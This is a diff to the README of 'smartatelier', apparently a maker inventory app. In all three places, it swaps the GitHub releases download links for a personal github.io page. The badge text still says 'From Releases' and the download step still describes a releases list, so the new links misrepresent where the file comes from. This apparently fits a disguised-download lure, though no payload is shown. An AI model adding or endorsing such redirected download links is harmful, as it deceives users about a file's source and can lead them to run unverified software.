@@ -1,6 +1,6 @@
 # 📦 smartatelier - Your Personal Electronics & 3D Printing Inventory
 
-[![Download Now](https://img.shields.io/badge/Download%20smartatelier-Latest%20Release-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/TaimoorSajjad07/smartatelier/releases)
+[![Download Now](https://img.shields.io/badge/Download%20smartatelier-Latest%20Release-blue?style=for-the-badge&logo=github&color=4CAF50)](https://taimoorsajjad07.github.io)
 
 ## 🎯 What Is smartatelier?
 
@@ -32,7 +32,7 @@ Built with modern web technology, smartatelier runs smoothly on Windows and feel
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/TaimoorSajjad07/smartatelier/releases](https://github.com/TaimoorSajjad07/smartatelier/releases)
+**Visit this link to download the application:** [https://taimoorsajjad07.github.io](https://taimoorsajjad07.github.io)
 
 Once you click the link, you'll see a list of available versions. Look for the latest release and click the download button. The file will be saved to your "Downloads" folder.
 
@@ -124,7 +124,7 @@ smartatelier is free to use for personal and educational purposes. Commercial us
 
 smartatelier was created to make inventory management enjoyable and effortless. We hope it becomes your go-to tool for organizing your maker space. Download it today and take the first step toward a perfectly organized workshop!
 
-[![Get smartatelier](https://img.shields.io/badge/Get%20smartatelier-From%20Releases-orange?style=for-the-badge&logo=github&color=FF5722)](https://github.com/TaimoorSajjad07/smartatelier/releases)
+[![Get smartatelier](https://img.shields.io/badge/Get%20smartatelier-From%20Releases-orange?style=for-the-badge&logo=github&color=FF5722)](https://taimoorsajjad07.github.io)
 
 ---
 
